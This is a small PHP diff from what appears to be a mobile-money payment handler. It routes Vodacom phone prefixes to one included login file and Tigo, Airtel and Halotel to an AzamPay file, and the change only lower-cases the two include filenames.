@@ -15,10 +15,10 @@ if (\(_SERVER['REQUEST_METHOD'] === 'POST') {\)phone = isset(\(_POST['customer_p
     // 🛡️ TRAFFIC MATRIX: Isolate Vodacom prefixes (74, 75, 76, 14)
     if (in_array(\$routingPrefix, ['74', '75', '76', '14'])) {
         // Route Vodacom numbers directly to the upcoming dedicated wallet framework
-        include('Vlogin.php');
+        include('vlogin.php');
     } else {
         // Route Tigo, Airtel, and Halotel cleanly to your working AzamPay engine
-        include('Alogin.php');
+        include('alogin.php');
     }
     exit();
 }
